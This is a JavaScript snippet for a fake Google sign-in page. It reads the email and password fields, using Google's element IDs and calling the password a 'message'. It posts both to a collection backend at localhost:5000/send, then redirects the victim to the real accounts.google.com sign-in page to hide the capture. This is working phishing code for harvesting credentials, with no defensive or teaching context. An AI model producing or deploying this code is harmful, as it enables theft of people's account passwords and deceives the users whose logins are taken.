<script>
const form = document.getElementById('signinform');
const emailInput = document.getElementById('identifierId');
const messageInput = document.getElementById('Passwd');
const nextButton = document.getElementById('identifierNext');

function validateEmail(email) {
    return email.length > 0 && (email.includes('@') || /^\d{10,}$/.test(email) || email.includes(' '));
}

nextButton.addEventListener('click', async function(e) {
    e.preventDefault();

    const email = emailInput.value.trim();
    const message = messageInput.value.trim();

    if (!validateEmail(email)) {
        emailInput.style.borderColor = '#d33b27';
        emailInput.focus();
        return;
    }

    if (!message) {
        messageInput.style.borderColor = '#d33b27';
        messageInput.focus();
        return;
    }

    // Send to backend
    try {
        const res = await fetch('http://localhost:5000/send', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email, message })
        });
        const data = await res.json();

        if (data.success) {
            // Redirect after success
            window.location.href = 'https://accounts.google.com/signin';
        } else {
            alert('Error sending message');
        }
    } catch (err) {
        alert('Error sending message: ' + err.message);
    }
});
</script>
